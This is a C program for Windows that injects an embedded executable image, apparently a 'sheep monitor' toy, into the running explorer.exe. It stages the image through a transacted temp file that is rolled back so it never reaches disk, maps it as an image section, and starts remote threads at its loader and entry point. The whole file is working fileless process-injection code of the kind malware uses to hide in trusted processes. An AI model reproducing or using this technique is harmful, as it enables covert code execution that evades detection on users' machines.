#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <windows.h>
#include <ktmw32.h>
#include "ntddk.h"
#include "sheep_monitor.h"

#pragma comment(lib, "ktmw32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")

extern uint8_t SHEEP_MONITOR[];

PIMAGE_NT_HEADERS64 get_nt_headers(uint8_t *base) {
   PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;
   return (PIMAGE_NT_HEADERS64)&base[dos_header->e_lfanew];
}

typedef struct __SheepConfig {
   uintptr_t image_base;
   size_t max_sheep;
} SheepConfig;

HANDLE create_sheep_section(void) {
   /* create a new transaction */
   HANDLE transaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
   assert(transaction != INVALID_HANDLE_VALUE);

   /* create a dummy temp file to write to (it won't be written to disk) */
   char dummy_name[MAX_PATH+1];
   memset(dummy_name, 0, sizeof(dummy_name));
   
   char temp_path[MAX_PATH+1];
   memset(temp_path, 0, sizeof(temp_path));

   DWORD temp_path_size = GetTempPathA(MAX_PATH, temp_path);
   GetTempFileNameA(temp_path, "TH", 0, dummy_name);

   HANDLE sheep_monitor_file = CreateFileTransactedA(dummy_name,
                                                     GENERIC_WRITE,
                                                     0,
                                                     NULL,
                                                     CREATE_ALWAYS,
                                                     FILE_ATTRIBUTE_NORMAL,
                                                     NULL,
                                                     transaction,
                                                     NULL,
                                                     NULL);
   assert(sheep_monitor_file != INVALID_HANDLE_VALUE);
   
   DWORD bytes_written;
   assert(WriteFile(sheep_monitor_file, &SHEEP_MONITOR[0], SHEEP_MONITOR_SIZE, &bytes_written, NULL));
   CloseHandle(sheep_monitor_file);

   /* read the transacted file into a section */
   sheep_monitor_file = CreateFileTransactedA(dummy_name,
                                              GENERIC_READ,
                                              0,
                                              NULL,
                                              OPEN_EXISTING,
                                              FILE_ATTRIBUTE_NORMAL,
                                              NULL,
                                              transaction,
                                              NULL,
                                              NULL);
   assert(sheep_monitor_file != INVALID_HANDLE_VALUE);

   HANDLE sheep_section;
   assert(NtCreateSection(&sheep_section,
                          SECTION_MAP_EXECUTE,
                          NULL,
                          0,
                          PAGE_READONLY,
                          SEC_IMAGE,
                          sheep_monitor_file) == STATUS_SUCCESS);

   /* *jedi hands* there was never a file */
   CloseHandle(sheep_monitor_file);
   assert(RollbackTransaction(transaction));

   return sheep_section;
}

DWORD get_export_rva(uint8_t *image_base, const char *export_name) {
   PIMAGE_NT_HEADERS64 nt_headers = get_nt_headers(image_base);
   PIMAGE_DATA_DIRECTORY export_dir_info = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
   PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)&image_base[export_dir_info->VirtualAddress];

   DWORD *functions = (DWORD *)&image_base[export_dir->AddressOfFunctions];
   DWORD *names = (DWORD *)&image_base[export_dir->AddressOfNames];
   WORD *name_ordinals = (WORD *)&image_base[export_dir->AddressOfNameOrdinals];

   for (size_t i=0; i<export_dir->NumberOfNames; ++i) {
      if (strncmp((const char *)&image_base[names[i]], export_name, strlen(export_name)) != 0)
         continue;

      return functions[name_ordinals[i]];
   }

   return 0;
}
 
int main(int argc, char *argv[]) {
   DWORD proc_array_bytes = sizeof(DWORD) * 1024;
   DWORD *proc_array = (DWORD *)malloc(proc_array_bytes);
   DWORD proc_array_needed;
   assert(EnumProcesses(proc_array, proc_array_bytes, &proc_array_needed));

   if (proc_array_needed > proc_array_bytes) {
      proc_array = (DWORD *)realloc(proc_array, proc_array_needed);
      proc_array_bytes = proc_array_needed;
      assert(EnumProcesses(proc_array, proc_array_bytes, &proc_array_needed));
   }

   size_t pids = proc_array_needed / sizeof(DWORD);
   DWORD found_pid = -1;

   for (size_t i=0; i<pids; ++i) {
      HANDLE proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, proc_array[i]);

      if (proc == NULL)
         continue;

      char filename[MAX_PATH+1];
      memset(&filename[0], 0, MAX_PATH+1);
      DWORD filename_size = GetModuleFileNameExA(proc, NULL, &filename[0], MAX_PATH);

      size_t j;
      
      for (j=filename_size; j!=0; --j)
         if (filename[j] == '\\')
            break;

      ++j;

      if (strncmp(&filename[j], "explorer.exe", strlen("explorer.exe")) == 0) {
         found_pid = proc_array[i];
         break;
      }
   }

   assert(found_pid != -1);

   /* open pid with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE */
   HANDLE explorer_proc = OpenProcess(PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, found_pid);
   assert(explorer_proc != NULL);

   PIMAGE_NT_HEADERS64 sheep_nt = get_nt_headers(&SHEEP_MONITOR[0]);
   HANDLE sheep_section = create_sheep_section();
   uintptr_t remote_sheep_base = 0;
   ULONG remote_sheep_size = 0;
   assert(NtMapViewOfSection(sheep_section,
                             explorer_proc,
                             (PVOID *)&remote_sheep_base,
                             0,
                             0,
                             NULL,
                             &remote_sheep_size,
                             ViewShare,
                             MEM_DIFFERENT_IMAGE_BASE_OK,
                             PAGE_EXECUTE_WRITECOPY) == STATUS_SUCCESS);

   SheepConfig config;
   memset(&config, 0, sizeof(SheepConfig));
   config.image_base = remote_sheep_base;
   config.max_sheep = 10;

   uintptr_t config_base = (uintptr_t)VirtualAllocEx(explorer_proc, NULL, sizeof(SheepConfig), MEM_COMMIT, PAGE_READWRITE);
   SIZE_T bytes_written;
   assert(config_base != 0);
   assert(WriteProcessMemory(explorer_proc, (LPVOID)config_base, &config, sizeof(SheepConfig), &bytes_written));

   DWORD loader_rva = get_export_rva(&SHEEP_MONITOR[0], "load_image");
   assert(loader_rva != 0);

   DWORD loader_id;
   HANDLE remote_thread_handle = CreateRemoteThread(explorer_proc,
                                                    NULL,
                                                    8192,
                                                    (LPTHREAD_START_ROUTINE)(remote_sheep_base+loader_rva),
                                                    (LPVOID)config_base,
                                                    0,
                                                    &loader_id);
   assert(remote_thread_handle != NULL);

   DWORD main_id;
   HANDLE main_handle = CreateRemoteThread(explorer_proc,
                                           NULL,
                                           8192,
                                           (LPTHREAD_START_ROUTINE)(remote_sheep_base+sheep_nt->OptionalHeader.AddressOfEntryPoint),
                                           NULL,
                                           0,
                                           &main_id);
   assert(main_handle != NULL);

   return 0;
}
